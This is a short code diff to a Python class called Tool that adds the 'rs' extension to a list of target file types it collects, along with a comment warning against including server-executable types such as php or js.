@@ -57,7 +57,7 @@ class Tool:
         self.files_found = []
         # Watch out! Do not include files that can run on your server. Ex: php, js, html...
         self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg",
-                        "epub", "mp3", "gif", "doc", "odp", "ods", "json",
+                        "epub", "mp3", "gif", "doc", "odp", "ods", "json", "rs",
                         "mp4", "avi", "md", "ogg", "m4a", "ini", "c", "cpp", "jar",
                         "rb", "java", "pl", "py", "apk", "raw", "eml", "msg", "tmp",
                         "conf", "config", "yaml", "asm", "h", "r", "m", "luac", "dat",
